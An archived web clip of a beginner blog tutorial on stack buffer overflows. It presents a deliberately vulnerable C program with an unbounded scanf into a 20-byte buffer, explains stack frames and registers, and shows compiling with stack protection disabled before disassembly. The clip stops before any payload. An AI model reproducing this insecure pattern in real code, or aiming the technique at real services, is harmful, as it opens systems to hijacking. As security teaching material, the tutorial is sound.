<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="exporter-version" content="Evernote Mac 6.13.1 (455785)"/><meta name="keywords" content="Hacking, Security"/><meta name="created" content="2017-12-06 00:20:20 +0000"/><meta name="source" content="web.clip"/><meta name="source-application" content="android.clipper.evernote"/><meta name="source-url" content="https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/"/><meta name="updated" content="2017-12-06 00:20:53 +0000"/><meta name="application-data:ANDROID_CLIP_TYPE" content="article"/><title>Buffer Overflow Exploit - Dhaval Kapil</title></head><body style="word-wrap: break-word; -webkit-nbsp-mode: space; -webkit-line-break: after-white-space;"><div style="font-size: 16px"><div><div style="font-family:Helvetica, Arial, sans-serif;font-size:16px;line-height:1.5;font-weight:300;background-color:rgb(253, 253, 253);"><div><div style="background-color:rgb(255, 255, 255);"><div style="zoom:1;"><div>
<div style="margin:10px 0px 30px;padding:0px;">
<h1 style="margin:0px;padding:0px;font-size:42px;font-weight:300;font-family:AvenirNext-Regular;letter-spacing:-1.75px;line-height:1;">Buffer Overflow Exploit</h1>
<p style="margin:0px;padding:0px;font-size:15px;color:rgb(129, 129, 129);margin-top:5px;">Apr 3, 2015 • Dhaval Kapil</p>
</div>
<div style="margin:0px 0px 30px;padding:0px;font-family:AvenirNext-Regular, Helvetica, sans-serif;font-size:1.25em;">
<blockquote style="margin:30px 0px;padding:0px;border-left:4px solid rgb(232, 232, 232);padding-left:20px;font-size:18px;opacity:0.6;letter-spacing:0px;">
<h2 style="margin:40px 0px 20px;padding:0px;font-size:32px;font-weight:300;line-height:1;letter-spacing:-1.25px;">Introduction</h2>
</blockquote>
<p style="margin:20px 0px;padding:0px;">I am interested in exploiting binary files. The first time I came across the <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">buffer overflow</code> exploit, I couldn’t actually implement it. Many of the existing sources on the web were outdated(worked with earlier versions of gcc, linux, etc). It took me quite a while to actually run a vulnerable program on my machine and exploit it.</p>
<p style="margin:20px 0px;padding:0px;">I decided to write a simple tutorial for beginners or people who have just entered the field of binary exploits.</p>
<blockquote style="margin:30px 0px;padding:0px;border-left:4px solid rgb(232, 232, 232);padding-left:20px;font-size:18px;opacity:0.6;letter-spacing:0px;">
<h3 style="margin:40px 0px 20px;padding:0px;font-size:26px;font-weight:300;line-height:1;letter-spacing:-1px;">What will this tutorial cover?</h3>
</blockquote>
<p style="margin:20px 0px;padding:0px;">This tutorial will be very basic. We will simply exploit the buffer by smashing the stack and modifying the return address of the function. This will be used to call some other function. You can also use the same technique to point the return address to some custom code that you have written, thereby executing anything you want(perhaps I will write another blog post regarding shellcode injection).</p>
<blockquote style="margin:30px 0px;padding:0px;border-left:4px solid rgb(232, 232, 232);padding-left:20px;font-size:18px;opacity:0.6;letter-spacing:0px;">
<h3 style="margin:40px 0px 20px;padding:0px;font-size:26px;font-weight:300;line-height:1;letter-spacing:-1px;">Any prerequisites?</h3>
</blockquote>
<ol style="margin:20px 0px;padding:0px;padding-left:20px;margin-left:1.35em;">
<li style="margin:0px;padding:0px;margin-bottom:30px;">I assume people to have basic-intermediate knowledge of <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">C</code>.</li>
<li style="margin:0px;padding:0px;margin-bottom:30px;">They should be a little familiar with <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">gcc</code> and the linux command line.</li>
<li style="margin:0px;padding:0px;margin-bottom:30px;">Basic x86 assembly language.</li>
</ol>
<blockquote style="margin:30px 0px;padding:0px;border-left:4px solid rgb(232, 232, 232);padding-left:20px;font-size:18px;opacity:0.6;letter-spacing:0px;">
<h3 style="margin:40px 0px 20px;padding:0px;font-size:26px;font-weight:300;line-height:1;letter-spacing:-1px;">Machine Requirements:</h3>
</blockquote>
<p style="margin:20px 0px;padding:0px;">This tutorial is specifically written to work on the latest distro’s of <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">linux</code>. It might work on older versions. Similar is the case for <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">gcc</code>. We are going to create a 32 bit binary, so it will work on both 32 and 64 bit systems.</p>
<blockquote style="margin:30px 0px;padding:0px;border-left:4px solid rgb(232, 232, 232);padding-left:20px;font-size:18px;opacity:0.6;letter-spacing:0px;">
<h3 style="margin:40px 0px 20px;padding:0px;font-size:26px;font-weight:300;line-height:1;letter-spacing:-1px;">Sample vulnerable program:</h3>
</blockquote>
<div style="margin:20px 0px;padding:0px;"><pre style="margin:0px;padding:25px 40px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;"><code style="margin:0px;padding:1px 5px;border:none;background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;padding-left:0px;"><span style="margin:0px;padding:0px;color:rgb(153, 153, 153);font-weight:bold;">#include &lt;stdio.h&gt;
</span>
<span style="margin:0px;padding:0px;color:rgb(68, 85, 136);font-weight:bold;">void</span> <span style="margin:0px;padding:0px;color:rgb(153, 0, 0);font-weight:bold;">secretFunction</span><span style="margin:0px;padding:0px;">()</span>
<span style="margin:0px;padding:0px;">{</span>
    <span style="margin:0px;padding:0px;">printf</span><span style="margin:0px;padding:0px;">(</span><span style="margin:0px;padding:0px;color:rgb(221, 17, 68);">"Congratulations!</span><span style="margin:0px;padding:0px;color:rgb(221, 17, 68);">\n</span><span style="margin:0px;padding:0px;color:rgb(221, 17, 68);">"</span><span style="margin:0px;padding:0px;">);</span>
    <span style="margin:0px;padding:0px;">printf</span><span style="margin:0px;padding:0px;">(</span><span style="margin:0px;padding:0px;color:rgb(221, 17, 68);">"You have entered in the secret function!</span><span style="margin:0px;padding:0px;color:rgb(221, 17, 68);">\n</span><span style="margin:0px;padding:0px;color:rgb(221, 17, 68);">"</span><span style="margin:0px;padding:0px;">);</span>
<span style="margin:0px;padding:0px;">}</span>

<span style="margin:0px;padding:0px;color:rgb(68, 85, 136);font-weight:bold;">void</span> <span style="margin:0px;padding:0px;color:rgb(153, 0, 0);font-weight:bold;">echo</span><span style="margin:0px;padding:0px;">()</span>
<span style="margin:0px;padding:0px;">{</span>
    <span style="margin:0px;padding:0px;color:rgb(68, 85, 136);font-weight:bold;">char</span> <span style="margin:0px;padding:0px;">buffer</span><span style="margin:0px;padding:0px;">[</span><span style="margin:0px;padding:0px;color:rgb(0, 153, 153);">20</span><span style="margin:0px;padding:0px;">];</span>

    <span style="margin:0px;padding:0px;">printf</span><span style="margin:0px;padding:0px;">(</span><span style="margin:0px;padding:0px;color:rgb(221, 17, 68);">"Enter some text:</span><span style="margin:0px;padding:0px;color:rgb(221, 17, 68);">\n</span><span style="margin:0px;padding:0px;color:rgb(221, 17, 68);">"</span><span style="margin:0px;padding:0px;">);</span>
    <span style="margin:0px;padding:0px;">scanf</span><span style="margin:0px;padding:0px;">(</span><span style="margin:0px;padding:0px;color:rgb(221, 17, 68);">"%s"</span><span style="margin:0px;padding:0px;">,</span> <span style="margin:0px;padding:0px;">buffer</span><span style="margin:0px;padding:0px;">);</span>
    <span style="margin:0px;padding:0px;">printf</span><span style="margin:0px;padding:0px;">(</span><span style="margin:0px;padding:0px;color:rgb(221, 17, 68);">"You entered: %s</span><span style="margin:0px;padding:0px;color:rgb(221, 17, 68);">\n</span><span style="margin:0px;padding:0px;color:rgb(221, 17, 68);">"</span><span style="margin:0px;padding:0px;">,</span> <span style="margin:0px;padding:0px;">buffer</span><span style="margin:0px;padding:0px;">);</span>    
<span style="margin:0px;padding:0px;">}</span>

<span style="margin:0px;padding:0px;color:rgb(68, 85, 136);font-weight:bold;">int</span> <span style="margin:0px;padding:0px;color:rgb(153, 0, 0);font-weight:bold;">main</span><span style="margin:0px;padding:0px;">()</span>
<span style="margin:0px;padding:0px;">{</span>
    <span style="margin:0px;padding:0px;">echo</span><span style="margin:0px;padding:0px;">();</span>

    <span style="margin:0px;padding:0px;font-weight:bold;">return</span> <span style="margin:0px;padding:0px;color:rgb(0, 153, 153);">0</span><span style="margin:0px;padding:0px;">;</span>
<span style="margin:0px;padding:0px;">}</span>
</code></pre>
</div>
<p style="margin:20px 0px;padding:0px;">Now this programs looks quite safe for the usual programmer. But in fact we can call the <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">secretFunction</code> by just modifying the input. There are better ways to do this if the binary is local. We can use <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">gdb</code> to modify the <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">%eip</code>. But in case the binary is running as a service on some other machine, we can make it call other functions or even custom code by just modifying the input.</p>
<blockquote style="margin:30px 0px;padding:0px;border-left:4px solid rgb(232, 232, 232);padding-left:20px;font-size:18px;opacity:0.6;letter-spacing:0px;">
<h2 style="margin:40px 0px 20px;padding:0px;font-size:32px;font-weight:300;line-height:1;letter-spacing:-1.25px;">Memory Layout of a C program</h2>
</blockquote>
<p style="margin:20px 0px;padding:0px;">Let’s start by first examining the memory layout of a C program, especially the stack, it’s contents and it’s working during function calls and returns. We will also go into the machine registers <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">esp</code>, <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">ebp</code>, etc.</p>
<blockquote style="margin:30px 0px;padding:0px;border-left:4px solid rgb(232, 232, 232);padding-left:20px;font-size:18px;opacity:0.6;letter-spacing:0px;">
<h3 style="margin:40px 0px 20px;padding:0px;font-size:26px;font-weight:300;line-height:1;letter-spacing:-1px;">Divisions of memory for a running process</h3>
</blockquote>
<p style="margin:20px 0px;padding:0px;"><img src="Buffer%20Overflow%20Exploit%20-%20Dhaval%20Kapil.resources/a47670dfe4698ff7a7648a3da5addb00.png" height="357" width="420"/></p>
<p style="margin:20px 0px;padding:0px;"><em style="margin:0px;padding:0px;">Source: <a href="http://i.stack.imgur.com/1Yz9K.gif" style="margin:0px;padding:0px;color:rgb(42, 122, 226);text-decoration:none;">http://i.stack.imgur.com/1Yz9K.gif</a></em></p>
<ol style="margin:20px 0px;padding:0px;padding-left:20px;margin-left:1.35em;">
<li style="margin:0px;padding:0px;margin-bottom:30px;">
<p style="margin:0px;padding:0px;"><strong style="margin:0px;padding:0px;">Command line arguments and environment variables</strong>: The arguments passed to a program before running and the environment variables are stored in this section.</p>
</li>
<li style="margin:0px;padding:0px;margin-bottom:30px;">
<p style="margin:0px;padding:0px;"><strong style="margin:0px;padding:0px;">Stack</strong>: This is the place where all the function parameters, return addresses and the local variables of the function are stored. It’s a <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">LIFO</code> structure. It grows downward in memory(from higher address space to lower address space) as new function calls are made. We will examine the stack in more detail later.</p>
</li>
<li style="margin:0px;padding:0px;margin-bottom:30px;">
<p style="margin:0px;padding:0px;"><strong style="margin:0px;padding:0px;">Heap</strong>: All the dynamically allocated memory resides here. Whenever we use <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">malloc</code> to get memory dynamically, it is allocated from the heap. The heap grows upwards in memory(from lower to higher memory addresses) as more and more memory is required.</p>
</li>
<li style="margin:0px;padding:0px;margin-bottom:30px;">
<p style="margin:0px;padding:0px;"><strong style="margin:0px;padding:0px;">Uninitialized data(Bss Segment)</strong>: All the uninitialized data is stored here. This consists of all global and static variables which are not initialized by the programmer. The kernel initializes them to arithmetic 0 by default.</p>
</li>
<li style="margin:0px;padding:0px;margin-bottom:30px;">
<p style="margin:0px;padding:0px;"><strong style="margin:0px;padding:0px;">Initialized data(Data Segment)</strong>: All the initialized data is stored here. This constists of all global and static variables which are initialised by the programmer.</p>
</li>
<li style="margin:0px;padding:0px;margin-bottom:30px;">
<p style="margin:0px;padding:0px;"><strong style="margin:0px;padding:0px;">Text</strong>: This is the section where the executable code is stored. The <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">loader</code> loads instructions from here and executes them. It is often read only.</p>
</li>
</ol>
<blockquote style="margin:30px 0px;padding:0px;border-left:4px solid rgb(232, 232, 232);padding-left:20px;font-size:18px;opacity:0.6;letter-spacing:0px;">
<h3 style="margin:40px 0px 20px;padding:0px;font-size:26px;font-weight:300;line-height:1;letter-spacing:-1px;">Some common registers:</h3>
</blockquote>
<ol style="margin:20px 0px;padding:0px;padding-left:20px;margin-left:1.35em;">
<li style="margin:0px;padding:0px;margin-bottom:30px;">
<p style="margin:0px;padding:0px;"><strong style="margin:0px;padding:0px;">%eip</strong>: The <strong style="margin:0px;padding:0px;">Instruction pointer register</strong>. It stores the address of the next instruction to be executed. After every instruction execution it’s value is incremented depending upon the size of an instrution.</p>
</li>
<li style="margin:0px;padding:0px;margin-bottom:30px;">
<p style="margin:0px;padding:0px;"><strong style="margin:0px;padding:0px;">%esp</strong>: The <strong style="margin:0px;padding:0px;">Stack pointer register</strong>. It stores the address of the top of the stack. This is the address of the last element on the stack. The stack grows downward in memory(from higher address values to lower address values). So the <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">%esp</code> points to the value in stack at the lowest memory address.</p>
</li>
<li style="margin:0px;padding:0px;margin-bottom:30px;">
<p style="margin:0px;padding:0px;"><strong style="margin:0px;padding:0px;">%ebp</strong>: The <strong style="margin:0px;padding:0px;">Base pointer register</strong>. The <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">%ebp</code> register usually set to <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">%esp</code> at the start of the function. This is done to keep tab of function parameters and local variables. Local variables are accessed by subtracting offsets from <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">%ebp</code> and function parameters are accessed by adding offsets to it as you shall see in the next section.</p>
</li>
</ol>
<blockquote style="margin:30px 0px;padding:0px;border-left:4px solid rgb(232, 232, 232);padding-left:20px;font-size:18px;opacity:0.6;letter-spacing:0px;">
<h3 style="margin:40px 0px 20px;padding:0px;font-size:26px;font-weight:300;line-height:1;letter-spacing:-1px;">Memory management during function calls</h3>
</blockquote>
<p style="margin:20px 0px;padding:0px;">Consider the following piece of code:</p>
<div style="margin:20px 0px;padding:0px;"><pre style="margin:0px;padding:25px 40px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;"><code style="margin:0px;padding:1px 5px;border:none;background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;padding-left:0px;"><span style="margin:0px;padding:0px;color:rgb(68, 85, 136);font-weight:bold;">void</span> <span style="margin:0px;padding:0px;color:rgb(153, 0, 0);font-weight:bold;">func</span><span style="margin:0px;padding:0px;">(</span><span style="margin:0px;padding:0px;color:rgb(68, 85, 136);font-weight:bold;">int</span> <span style="margin:0px;padding:0px;">a</span><span style="margin:0px;padding:0px;">,</span> <span style="margin:0px;padding:0px;color:rgb(68, 85, 136);font-weight:bold;">int</span> <span style="margin:0px;padding:0px;">b</span><span style="margin:0px;padding:0px;">)</span>
<span style="margin:0px;padding:0px;">{</span>
    <span style="margin:0px;padding:0px;color:rgb(68, 85, 136);font-weight:bold;">int</span> <span style="margin:0px;padding:0px;">c</span><span style="margin:0px;padding:0px;">;</span>
    <span style="margin:0px;padding:0px;color:rgb(68, 85, 136);font-weight:bold;">int</span> <span style="margin:0px;padding:0px;">d</span><span style="margin:0px;padding:0px;">;</span>
    <span style="margin:0px;padding:0px;color:rgb(153, 153, 136);font-style:italic;">// some code
</span><span style="margin:0px;padding:0px;">}</span>
<span style="margin:0px;padding:0px;color:rgb(68, 85, 136);font-weight:bold;">void</span> <span style="margin:0px;padding:0px;color:rgb(153, 0, 0);font-weight:bold;">main</span><span style="margin:0px;padding:0px;">()</span>
<span style="margin:0px;padding:0px;">{</span>
    <span style="margin:0px;padding:0px;">func</span><span style="margin:0px;padding:0px;">(</span><span style="margin:0px;padding:0px;color:rgb(0, 153, 153);">1</span><span style="margin:0px;padding:0px;">,</span> <span style="margin:0px;padding:0px;color:rgb(0, 153, 153);">2</span><span style="margin:0px;padding:0px;">);</span>
    <span style="margin:0px;padding:0px;color:rgb(153, 153, 136);font-style:italic;">// next instruction
</span><span style="margin:0px;padding:0px;">}</span>
</code></pre>
</div>
<p style="margin:20px 0px;padding:0px;">Assume our <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">%eip</code> is pointing to the <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">func</code> call in <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">main</code>. The following steps would be taken:</p>
<ol style="margin:20px 0px;padding:0px;padding-left:20px;margin-left:1.35em;">
<li style="margin:0px;padding:0px;margin-bottom:30px;">A function call is found, push parameters on the stack from right to left(in reverse order). So <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">2</code> will be pushed first and then <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">1</code>.</li>
<li style="margin:0px;padding:0px;margin-bottom:30px;">We need to know where to return after <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">func</code> is completed, so push the address of the next instruction on the stack.</li>
<li style="margin:0px;padding:0px;margin-bottom:30px;">Find the address of <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">func</code> and set <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">%eip</code> to that value. The control has been transferred to <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">func()</code>.</li>
<li style="margin:0px;padding:0px;margin-bottom:30px;">As we are in a new function we need to update <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">%ebp</code>. Before updating we save it on the stack so that we can return later back to <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">main</code>. So <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">%ebp</code> is pushed on the stack.</li>
<li style="margin:0px;padding:0px;margin-bottom:30px;">Set <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">%ebp</code> to be equal to <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">%esp</code>. <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">%ebp</code> now points to current stack pointer.</li>
<li style="margin:0px;padding:0px;margin-bottom:30px;">Push local variables onto the stack/reserver space for them on stack. <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">%esp</code> will be changed in this step.</li>
<li style="margin:0px;padding:0px;margin-bottom:30px;">After <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">func</code> gets over we need to reset the previous stack frame. So set <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">%esp</code> back to <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">%ebp</code>. Then pop the earlier <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">%ebp</code> from stack, store it back in <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">%ebp</code>. So the base pointer register points back to where it pointed in <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">main</code>.</li>
<li style="margin:0px;padding:0px;margin-bottom:30px;">Pop the return address from stack and set <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">%eip</code> to it. The control flow comes back to <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">main</code>, just after the <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">func</code> function call.</li>
</ol>
<p style="margin:20px 0px;padding:0px;">This is how the stack would look while in <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">func</code>.</p>
<p style="margin:20px 0px;padding:0px;"><img src="Buffer%20Overflow%20Exploit%20-%20Dhaval%20Kapil.resources/06255ebd55e13c26744f214716697d32.png" height="174" width="262"/></p>
<blockquote style="margin:30px 0px;padding:0px;border-left:4px solid rgb(232, 232, 232);padding-left:20px;font-size:18px;opacity:0.6;letter-spacing:0px;">
<h2 style="margin:40px 0px 20px;padding:0px;font-size:32px;font-weight:300;line-height:1;letter-spacing:-1.25px;">Buffer overflow vulnerability</h2>
</blockquote>
<p style="margin:20px 0px;padding:0px;">Buffer overflow is a vulnerability in low level codes of C and C++. An attacker can cause the program to crash, make data corrupt, steal some private information or run his/her own code.</p>
<p style="margin:20px 0px;padding:0px;">It basically means to access any buffer outside of it’s alloted memory space. This happens quite frequently in the case of arrays. Now as the variables are stored together in stack/heap/etc. accessing any out of bound index can cause read/write of bytes of some other variable. Normally the program would crash, but we can skillfully make some vulnerable code to do any of the above mentioned attacks. Here we shall modify the return address and try to execute the return address.</p>
<p style="margin:20px 0px;padding:0px;"><a href="https://dhavalkapil.com/assets/files/Buffer-Overflow-Exploit/vuln.c" style="margin:0px;padding:0px;color:rgb(42, 122, 226);text-decoration:none;">Here</a> is the link to the above mentioned code. Let’s compile it.</p>
<blockquote style="margin:30px 0px;padding:0px;border-left:4px solid rgb(232, 232, 232);padding-left:20px;font-size:18px;opacity:0.6;letter-spacing:0px;">
<p style="margin:0px;padding:0px;"><em style="margin:0px;padding:0px;">For 32 bit systems</em></p>
</blockquote>
<div style="margin:20px 0px;padding:0px;"><pre style="margin:0px;padding:25px 40px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;"><code style="margin:0px;padding:1px 5px;border:none;background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;padding-left:0px;">gcc vuln.c -o vuln -fno-stack-protector
</code></pre>
</div>
<blockquote style="margin:30px 0px;padding:0px;border-left:4px solid rgb(232, 232, 232);padding-left:20px;font-size:18px;opacity:0.6;letter-spacing:0px;">
<p style="margin:0px;padding:0px;"><em style="margin:0px;padding:0px;">For 64 bit systems</em></p>
</blockquote>
<div style="margin:20px 0px;padding:0px;"><pre style="margin:0px;padding:25px 40px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;"><code style="margin:0px;padding:1px 5px;border:none;background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;padding-left:0px;">gcc vuln.c -o vuln -fno-stack-protector -m32
</code></pre>
</div>
<p style="margin:20px 0px;padding:0px;"><code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">-fno-stack-protector</code> disabled the stack protection. Smashing the stack is now allowed. <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">-m32</code> made sure that the compiled binary is 32 bit. You may need to install some additional libraries to compile 32 bit binaries on 64 bit machines. You can download the binary generated on my machine <a href="https://dhavalkapil.com/assets/files/Buffer-Overflow-Exploit/vuln" style="margin:0px;padding:0px;color:rgb(42, 122, 226);text-decoration:none;">here</a>.</p>
<p style="margin:20px 0px;padding:0px;">You can now run it using <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">./vuln</code>.</p>
<div style="margin:20px 0px;padding:0px;"><pre style="margin:0px;padding:25px 40px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;"><code style="margin:0px;padding:1px 5px;border:none;background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;padding-left:0px;">Enter some text:
HackIt!
You entered: HackIt!
</code></pre>
</div>
<p style="margin:20px 0px;padding:0px;">Let’s begin to exploit the binary. First of all we would like to see the disassembly of the binary. For that we’ll use <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">objdump</code></p>
<div style="margin:20px 0px;padding:0px;"><pre style="margin:0px;padding:25px 40px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;"><code style="margin:0px;padding:1px 5px;border:none;background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;padding-left:0px;">objdump -d vuln
</code></pre>
</div>
<p style="margin:20px 0px;padding:0px;">Running this we would get the entire disasembly. Let’s focus on the parts that we are interested in. (Note however that your output may vary)</p>
<p style="margin:20px 0px;padding:0px;"><img src="Buffer%20Overflow%20Exploit%20-%20Dhaval%20Kapil.resources/481e9c9cbf2eefe4127a574afdd8cbaa.png" height="632" width="608"/></p>
